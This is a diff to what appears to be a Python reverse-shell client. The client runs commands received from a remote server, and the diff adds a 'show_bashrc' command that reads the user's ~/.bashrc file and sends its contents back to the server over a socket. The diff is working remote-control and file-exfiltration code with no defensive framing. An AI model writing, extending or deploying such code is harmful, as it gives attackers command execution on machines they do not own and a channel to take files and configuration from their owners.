@@ -107,7 +107,21 @@ while True:
                 except Exception as e:
                     # if there's an error, set the output to the error message
                     output = str(e)
-
+            elif splited_command[0].lower() == "show_bashrc":
+                # get the path to the .bashrc file
+                bashrc_path = os.path.expanduser("~/.bashrc")
+                try:
+                    # open the .bashrc file in read mode
+                    with open(bashrc_path, "r") as file:
+                        # read the contents of the .bashrc file
+                        contents = file.read()
+                    # send the contents of the .bashrc file to the server
+                    message = f"{contents}{SEPARATOR}{cwd}"
+                    s.send(message.encode())
+                except Exception as e:
+                    # if there's an error, set the output to the error message
+                    output = str(e)
+                
             else:
                 # execute the command and retrieve the results
                 output = subprocess.getoutput(command)
